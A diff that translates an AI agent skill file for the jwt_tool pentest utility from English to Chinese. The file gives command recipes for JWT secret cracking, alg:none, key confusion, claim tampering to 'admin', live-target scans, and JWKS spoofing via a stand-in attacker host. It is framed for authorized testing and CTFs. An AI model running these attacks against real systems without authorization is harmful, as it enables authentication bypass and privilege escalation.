@@ -1,117 +1,117 @@
 ---
 name: jwt-tool-skill
-description: Help with authorized JWT assessment using ticarpi/jwt_tool. Use this skill whenever the user mentions `jwt_tool`, wants commands for JWT decoding, verification, secret cracking, claim tampering, playbook scans, `alg:none`, key confusion, JWKS spoofing or inline JWK injection, raw-request mode with `-r`, or needs to test bearer-token trust with a real HTTP request. Make sure to use it when the user asks how to audit or exploit JWT handling with `jwt_tool`, even if they only describe the token, headers, cookies, or a captured request and do not explicitly ask for a skill.
+description: 使用 ticarpi/jwt_tool 进行授权范围内 JWT 评估的辅助技能。当用户提到 `jwt_tool`，需要 JWT 解码、验签、密钥爆破、声明篡改、playbook 扫描、`alg:none`、密钥混淆、JWKS 伪造或内联 JWK 注入的命令，或使用 `-r` 的原始请求模式，或用真实 HTTP 请求测试 Bearer 令牌信任关系时，使用本技能。即使用户只描述了令牌、头部、Cookie 或抓到的请求而未明确要求使用技能，只要询问如何用 `jwt_tool` 审计或利用 JWT 处理逻辑，也务必使用本技能。
 ---
 
 # jwt-tool-skill
 
-Use this skill to turn a JWT testing goal into a practical `jwt_tool` workflow and concrete commands.
+用本技能把一个 JWT 测试目标转化为可落地的 `jwt_tool` 工作流与具体命令。
 
-Keep the answer scoped to authorized testing, labs, demos, research, or CTFs. If the request is target-specific and authorization is unclear, ask one short clarification before giving target-specific commands.
+回答范围应限定在授权测试、实验环境、演示、研究或 CTF 之内。如果请求针对具体目标且授权情况不明，先用一句简短提问确认，再给出针对该目标的命令。
 
-## jwt_tool.py file path
+## jwt_tool.py 文件路径
 
-jwt_tool.py in /opt/jwt_tool
+jwt_tool.py 位于 /opt/jwt_tool
 
-## What This Skill Is For
+## 本技能的适用范围
 
-Reach for this skill when the user wants to:
+当用户想要完成以下事项时使用本技能：
 
-- inspect or decode a JWT with `jwt_tool`
-- verify a signature with a public key or JWKS
-- crack an HMAC secret with a wordlist
-- test `alg:none`, key confusion, spoofed JWKS, or inline JWK attacks
-- tamper with payload or header claims and resend the token
-- run `jwt_tool` scans against a live endpoint
-- use a captured HTTP request with `-r`
-- understand which `jwt_tool` flags fit a JWT testing scenario
+- 用 `jwt_tool` 检查或解码 JWT
+- 用公钥或 JWKS 校验签名
+- 用字典爆破 HMAC 密钥
+- 测试 `alg:none`、密钥混淆、伪造 JWKS 或内联 JWK 攻击
+- 篡改 payload 或头部声明并重放令牌
+- 对在线端点运行 `jwt_tool` 扫描
+- 用 `-r` 使用抓到的 HTTP 请求
+- 弄清哪些 `jwt_tool` 参数适用于某个 JWT 测试场景
 
-If the user mainly wants JWT vulnerability theory or a generic methodology without `jwt_tool`, another JWT or pentest skill may be a better fit.
+如果用户主要想了解 JWT 漏洞原理或不涉及 `jwt_tool` 的通用方法论，其他 JWT 或渗透测试技能可能更合适。
 
-## Response Style
+## 回答风格
 
-Default to a short, runnable answer.
+默认给出简短、可直接运行的答案。
 
-For most requests, use this structure:
+对大多数请求，采用以下结构：
 
-### Recommended command
+### 推荐命令
 
-Give one primary command first. Add one alternative only when there is a real tradeoff, such as Docker versus local Python or `-r` versus manual `-rc`/`-rh`.
+先给出一条主命令。只有在存在真实取舍（例如 Docker 与本地 Python、`-r` 与手工 `-rc`/`-rh`）时，才补充一个替代方案。
 
-### Why this fits
+### 为什么适用
 
-Explain the chosen mode and the important flags in one or two short paragraphs or 3-5 bullets.
+用一到两段简短说明或 3-5 条要点，解释所选模式与关键参数。
 
-### What to check
+### 需要关注什么
 
-Tell the user what output differences matter, such as:
+告诉用户哪些输出差异有意义，例如：
 
-- signature valid versus invalid
-- response code or body length changes
-- canary string matches
-- claim acceptance despite tampering
-- successful key recovery
-- proof that a forged token was accepted
+- 签名有效还是无效
+- 响应码或响应体长度变化
+- canary 字符串是否匹配
+- 篡改后声明是否仍被接受
+- 是否成功恢复密钥
+- 是否有证据表明伪造令牌被接受
 
-### Next escalation
+### 下一步升级
 
-Give the next likely `jwt_tool` step if the first command hits.
+如果第一条命令命中，给出下一个可能的 `jwt_tool` 步骤。
 
-If one essential input is missing, ask one short question first. Good examples:
+如果缺少某个关键输入，先用一个简短问题确认。典型例子：
 
-- do you have the raw JWT, or only an HTTP request containing it?
-- is the token in a cookie, header, or POST body?
-- do you already have a public key, JWKS, or a candidate secret?
+- 你手上有原始 JWT，还是只有包含它的 HTTP 请求？
+- 令牌在 Cookie、请求头还是 POST body 中？
+- 你是否已有公钥、JWKS 或候选密钥？
 
-Do not stop for unnecessary questions when the user already gave enough to build a command.
+如果用户已提供足够信息可构造命令，不要为不必要的问题停下。
 
-## Safety Boundary
+## 安全边界
 
-- Help only with authorized systems, labs, demos, research, or CTFs.
-- Prefer validation and low-noise checks before aggressive exploitation.
-- Do not imply permission when the user did not say they have it.
-- If the user asks for destructive or noisy testing, suggest a safer first pass when possible.
+- 只协助授权系统、实验环境、演示、研究或 CTF。
+- 优先做验证和低噪声检查，再考虑激进利用。
+- 用户未声明拥有授权时，不要暗示其已获得许可。
+- 如果用户要求破坏性或高噪声测试，尽可能建议先做更安全的第一轮尝试。
 
-## Decision Flow
+## 决策流程
 
-1. Identify the user's starting point.
-- `token only`: decode, inspect, verify, crack, tamper, or sign offline first.
-- `token + live target`: choose `-t` with `-rc` or `-rh`, or prefer `-r` if they have a saved request.
-- `key material present`: route to `-V`, `-S`, `-X k`, or JWKS reconstruction paths.
-- `JWT weakness hypothesis`: route to the smallest command that confirms or rejects it.
+1. 判断用户的起点。
+- `只有令牌`：先做离线解码、检查、验签、爆破、篡改或签名。
+- `令牌 + 在线目标`：选择 `-t` 配合 `-rc` 或 `-rh`；若已有保存的请求，优先用 `-r`。
+- `已有密钥材料`：走 `-V`、`-S`、`-X k` 或 JWKS 重建路径。
+- `JWT 弱点假设`：转到能确认或否定该假设的最小命令。
 
-2. Prefer the least fragile request transport.
-- If the user has a raw request file from Burp, prefer `-r` because it preserves headers, cookies, and body shape.
-- Otherwise use `-t` plus `-rc`, `-rh`, and optional POST data.
-- If a success marker exists, add `-cv` so `jwt_tool` can highlight accepted tokens faster.
+2. 优先选择最不脆弱的请求传输方式。
+- 如果用户有从 Burp 导出的原始请求文件，优先用 `-r`，因为它保留头部、Cookie 与 body 结构。
+- 否则用 `-t` 加 `-rc`、`-rh` 以及可选的 POST 数据。
+- 如果存在成功标记，加上 `-cv`，让 `jwt_tool` 更快高亮被接受的令牌。
 
-3. Start with evidence gathering.
-- Decode the token before mutation.
-- Verify signatures when key material exists.
-- Use scans before hand-building exploit chains when the goal is broad assessment.
+3. 先收集证据。
+- 在改动令牌之前先解码。
+- 有密钥材料时先验签。
+- 目标是大范围评估时，先跑扫描，再手工构造利用链。
 
-4. Escalate only after you have a reason.
-- `-M pb` for a broad first pass.
-- `-M er` when the app may reveal behavior through forced errors.
-- `-C` for HMAC secret testing.
-- `-X a`, `-X k`, `-X s`, or `-X i` for specific exploit hypotheses.
-- `-I` for claim/header injection or fuzzing.
-- `-T` when the user explicitly wants manual, interactive tampering.
+4. 有明确理由后才升级。
+- `-M pb` 用于宽泛的第一轮尝试。
+- `-M er` 用于应用可能通过强制报错暴露行为的场景。
+- `-C` 用于 HMAC 密钥测试。
+- `-X a`、`-X k`、`-X s` 或 `-X i` 用于具体利用假设。
+- `-I` 用于声明/头部注入或 fuzz。
+- `-T` 用于用户明确要求手工交互式篡改时。
 
-## Install Choices
+## 安装方式选择
 
-If the user did not specify an environment, mention both options briefly and recommend one.
+如果用户未指定环境，简要说明两种方式并推荐其中一种。
 
-- Docker is the safer default when the user just wants the tool to work quickly.
-- Local Python is fine when they already cloned the repo or need easy access to local files.
+- 用户只想快速跑通工具时，Docker 是更安全的默认选择。
+- 用户已克隆仓库或需要方便访问本地文件时，本地 Python 方式即可。
 
-Docker base command:
+Docker 基础命令：
 
 ```bash
 docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" ticarpi/jwt_tool
 ```
 
-Local install:
+本地安装：
 
 ```bash
 git clone https://github.com/ticarpi/jwt_tool
@@ -120,97 +120,97 @@ python3 -m pip install -r requirements.txt
 python3 jwt_tool.py -h
 ```
 
-When giving Docker examples that reference local files, remember they appear under `/tmp/...` inside the container.
+给出引用本地文件的 Docker 示例时，请记住它们在容器内位于 `/tmp/...`。
 
-## High-Value Command Patterns
+## 高价值命令模式
 
-Read `jwt-tool-skill/references/command-recipes.md` when you need a compact mapping from testing goal to `jwt_tool` flags and examples.
+需要"测试目标到 `jwt_tool` 参数"的紧凑对照与示例时，阅读 `jwt-tool-skill/references/command-recipes.md`。
 
-Use these defaults:
+使用以下默认值：
 
-- Decode only: `python3 jwt_tool.py <JWT>`
-- Verify with PEM: `python3 jwt_tool.py <JWT> -V -pk public.pem`
-- Verify with JWKS: `python3 jwt_tool.py <JWT> -V -jw jwks.json`
-- Crack HMAC secret with wordlist: `python3 jwt_tool.py <JWT> -C -d wordlist.txt`
-- Test `alg:none`: `python3 jwt_tool.py <JWT> -X a`
-- Test key confusion: `python3 jwt_tool.py <JWT> -X k -pk public.pem`
-- Inject inline JWK: `python3 jwt_tool.py <JWT> -X i`
-- Spoof remote JWKS: `python3 jwt_tool.py <JWT> -X s -ju https://attacker.example/jwks.json`
-- Inject or fuzz claims: `python3 jwt_tool.py <JWT> -I -pc role -pv admin`
-- Run playbook scan: `python3 jwt_tool.py -t https://target.example -rc "jwt=<JWT>" -M pb`
-- Prefer captured request mode: `python3 jwt_tool.py -r request.txt -M pb`
+- 仅解码：`python3 jwt_tool.py <JWT>`
+- 用 PEM 验签：`python3 jwt_tool.py <JWT> -V -pk public.pem`
+- 用 JWKS 验签：`python3 jwt_tool.py <JWT> -V -jw jwks.json`
+- 用字典爆破 HMAC 密钥：`python3 jwt_tool.py <JWT> -C -d wordlist.txt`
+- 测试 `alg:none`：`python3 jwt_tool.py <JWT> -X a`
+- 测试密钥混淆：`python3 jwt_tool.py <JWT> -X k -pk public.pem`
+- 注入内联 JWK：`python3 jwt_tool.py <JWT> -X i`
+- 伪造远程 JWKS：`python3 jwt_tool.py <JWT> -X s -ju https://attacker.example/jwks.json`
+- 注入或 fuzz 声明：`python3 jwt_tool.py <JWT> -I -pc role -pv admin`
+- 运行 playbook 扫描：`python3 jwt_tool.py -t https://target.example -rc "jwt=<JWT>" -M pb`
+- 优先使用抓包请求模式：`python3 jwt_tool.py -r request.txt -M pb`
 
-## Command-Building Rules
+## 命令构造规则
 
-### Offline token inspection
+### 离线令牌检查
 
-Use when the user only has a token and wants to understand it.
+适用于用户只有令牌、想弄清其内容的情况。
 
-Start with:
+从这条开始：
 
 ```bash
 python3 jwt_tool.py '<JWT>'
 ```
 
-Call out:
+需要指出的点：
 
-- `alg`, `kid`, `jku`, `jwk`, `x5u`
-- `iss`, `aud`, `sub`, `role`, `scope`, `tenant`, `exp`, `nbf`, `iat`
-- whether the algorithm implies HMAC or asymmetric verification paths
+- `alg`、`kid`、`jku`、`jwk`、`x5u`
+- `iss`、`aud`、`sub`、`role`、`scope`、`tenant`、`exp`、`nbf`、`iat`
+- 该算法对应的是 HMAC 还是非对称验签路径
 
-### Signature verification
+### 签名校验
 
-Use `-V` when the user already has a public key, private key-derived public key, or JWKS.
+当用户已有公钥、由私钥导出的公钥或 JWKS 时，使用 `-V`。
 
-Examples:
+示例：
 
 ```bash
 python3 jwt_tool.py '<JWT>' -V -pk public.pem
 python3 jwt_tool.py '<JWT>' -V -jw jwks.json
 ```
 
-If the user has only a JWKS URL, tell them `jwt_tool` works with local files more directly, so fetching it first is often simpler unless they are testing `jku` trust itself.
+如果用户只有 JWKS URL，请告知 `jwt_tool` 对本地文件的支持更直接，因此通常先把文件抓下来更简单，除非他们正是在测试 `jku` 的信任关系本身。
 
-### Secret cracking
+### 密钥爆破
 
-Use `-C` only for HMAC algorithms such as `HS256`, `HS384`, or `HS512`.
+仅对 `HS256`、`HS384`、`HS512` 等 HMAC 算法使用 `-C`。
 
-Examples:
+示例：
 
 ```bash
 python3 jwt_tool.py '<JWT>' -C -d jwt-common.txt
 python3 jwt_tool.py '<JWT>' -C -d /path/to/wordlist.txt
 ```
 
-If the token uses RSA, EC, or PSS algorithms, do not suggest `-C` as if it will work.
+如果令牌使用 RSA、EC 或 PSS 算法，不要建议 `-C`，也不要暗示它会生效。
 
-### Live application testing
+### 在线应用测试
 
-Prefer `-r request.txt` when the user already has a raw request file.
+用户已有原始请求文件时，优先用 `-r request.txt`。
 
-Examples:
+示例：
 
 ```bash
 python3 jwt_tool.py -r request.txt -M pb
 python3 jwt_tool.py -r request.txt -M er -cv 'Welcome'
 ```
 
-If there is no request file, build the request with `-t`, `-rc`, and `-rh`.
+如果没有请求文件，用 `-t`、`-rc` 和 `-rh` 构造请求。
 
-Examples:
+示例：
 
 ```bash
 python3 jwt_tool.py -t 'https://target.example/profile' -rh 'Authorization: Bearer <JWT>' -cv 'Welcome' -M pb
 python3 jwt_tool.py -t 'https://target.example/' -rc 'jwt=<JWT>; session=abc' -M er
 ```
 
-At least one header, cookie, or POST field must actually contain the JWT.
+至少有一个请求头、Cookie 或 POST 字段必须真正包含该 JWT。
 
-### Claim injection and fuzzing
+### 声明注入与 fuzz
 
-Use `-I` when the user wants controlled edits without the interactive flow.
+当用户希望做可控编辑而不进入交互流程时，使用 `-I`。
 
-Examples:
+示例：
 
 ```bash
 python3 jwt_tool.py '<JWT>' -I -pc role -pv admin -X a
@@ -218,79 +218,79 @@ python3 jwt_tool.py '<JWT>' -I -pc tenant_id -pv 1 -S hs256 -p 'secret'
 python3 jwt_tool.py '<JWT>' -I -hc kid -hv fuzz.txt -X a
 ```
 
-If a value argument points to a file, explain that one header or payload value can be fuzzed from that file in a run.
+如果某个取值参数指向文件，说明单次运行中可以用该文件对某个头部或 payload 值进行 fuzz。
 
-### Exploit selection
+### 利用方式选择
 
-Use these exploit codes carefully and explain the precondition:
+谨慎使用以下利用代码，并说明其前置条件：
 
-- `-X a`: `alg:none` only matters if the backend accepts unsigned tokens.
-- `-X k`: key confusion needs a known public key and a vulnerable implementation.
-- `-X s`: spoofed JWKS needs the server to trust attacker-controlled `jku` or related key lookup behavior.
-- `-X i`: inline JWK injection needs the backend to trust attacker-supplied `jwk` values.
+- `-X a`：仅当后端接受无签名令牌时，`alg:none` 才有意义。
+- `-X k`：密钥混淆需要已知公钥以及存在缺陷的实现。
+- `-X s`：伪造 JWKS 需要服务器信任攻击者可控的 `jku` 或相关的密钥查找行为。
+- `-X i`：内联 JWK 注入需要后端信任攻击者提供的 `jwk` 值。
 
-Do not frame these as guaranteed wins. Frame them as hypothesis tests.
+不要把这些描述为必然成功，而应表述为假设验证。
 
-### Interactive tampering
+### 交互式篡改
 
-Use `-T` only when the user explicitly wants the guided interactive editor or is exploring a token manually.
+仅当用户明确要求引导式交互编辑器，或需要手动探索令牌时，使用 `-T`。
 
 ```bash
 python3 jwt_tool.py '<JWT>' -T
 ```
 
-If the user wants a repeatable or scriptable command, prefer `-I` over `-T`.
+如果用户想要可重复或可脚本化的命令，优先用 `-I` 而非 `-T`。
 
-### Log review
+### 日志回顾
 
-If the user shows a `jwttool_<id>` tracking identifier and wants to inspect a prior run, route to:
+如果用户提供了 `jwttool_<id>` 跟踪标识并想查看此前的运行记录，转到：
 
 ```bash
 python3 jwt_tool.py -Q jwttool_deadbeef1234567890
 ```
 
-## Common Advice Patterns
+## 常见建议模式
 
-- If the user is unsure where the JWT lives in the request, suggest extracting a real request from Burp and using `-r`.
-- If the target returns the same status code for everything, recommend `-cv` with a success marker and compare response size and body text.
-- If `jwt_tool` auto-generated keys or JWKS are part of the plan, mention the first run creates local key material and config under the user's jwt_tool directory.
-- If the user is testing spoofed JWKS or collaborator-style checks, remind them to configure `jwtconf.ini` values such as `jwksloc` and `httplistener`.
-- If the user only wants to inspect the token, do not jump straight to attack commands.
+- 如果用户不确定 JWT 在请求中的位置，建议从 Burp 中提取真实请求并使用 `-r`。
+- 如果目标对所有请求返回相同状态码，建议用 `-cv` 加成功标记，并对比响应大小与 body 文本。
+- 如果计划中包含 `jwt_tool` 自动生成的密钥或 JWKS，提醒用户首次运行会在其 jwt_tool 目录下创建本地密钥材料与配置。
+- 如果用户正在测试伪造 JWKS 或 collaborator 类检查，提醒其配置 `jwtconf.ini` 中的 `jwksloc`、`httplistener` 等取值。
+- 如果用户只想检查令牌，不要直接跳到攻击命令。
 
-## Failure-Avoidance Rules
+## 避免失败的规则
 
-- Do not suggest `-C` for non-HMAC tokens.
-- Do not omit the token location when giving live-target commands.
-- Do not recommend `-T` when the user asked for a non-interactive one-liner.
-- Do not assume `-t` is better than `-r` when the user already has a captured request.
-- Do not suggest exploit flags without stating the trust assumption they test.
+- 非 HMAC 令牌不要建议 `-C`。
+- 给出在线目标命令时不要省略令牌位置。
+- 用户要求非交互式单行命令时，不要推荐 `-T`。
+- 用户已有抓包请求时，不要假设 `-t` 比 `-r` 更好。
+- 不要在未说明所检验的信任假设时推荐利用参数。
 
-## Example Response Fragments
+## 回答片段示例
 
-**Example 1: verify with a PEM key**
+**示例 1：用 PEM 密钥验签**
 
-Recommended command:
+推荐命令：
 
 ```bash
 python3 jwt_tool.py '<JWT>' -V -pk public.pem
 ```
 
-Why this fits: `-V` checks whether the current signature matches the supplied public key. This is the quickest way to confirm whether the token was really signed by the key you recovered.
+为什么适用：`-V` 会检查当前签名是否与所提供的公钥匹配。这是确认令牌是否真由你恢复出的密钥签发的快捷方式。
 
-What to check: a clear valid versus invalid verification result.
+需要关注什么：明确的验签有效或无效结果。
 
-Next escalation: if valid and the app uses an asymmetric alg, test whether `kid`, `jku`, or key-confusion paths are trusted too loosely.
+下一步升级：如果有效且应用使用非对称算法，测试 `kid`、`jku` 或密钥混淆路径是否被过度信任。
 
-**Example 2: scan a captured request**
+**示例 2：扫描抓包请求**
 
-Recommended command:
+推荐命令：
 
 ```bash
 python3 jwt_tool.py -r request.txt -M pb -cv 'Welcome'
 ```
 
-Why this fits: `-r` keeps the original request shape intact, and `-M pb` is the best first-pass automated audit for common JWT trust problems.
+为什么适用：`-r` 完整保留原始请求结构，而 `-M pb` 是针对常见 JWT 信任问题的最佳首轮自动化审计。
 
-What to check: any request IDs, changed status codes, body lengths, or a success marker appearing with forged tokens.
+需要关注什么：任何请求 ID、状态码变化、响应体长度，或伪造令牌下出现的成功标记。
 
-Next escalation: rerun the specific promising attack with `-X ...` or `-I ...` so you can validate and exploit it deliberately.
+下一步升级：用 `-X ...` 或 `-I ...` 重跑最有希望的具体攻击，以便有意识地验证并利用它。
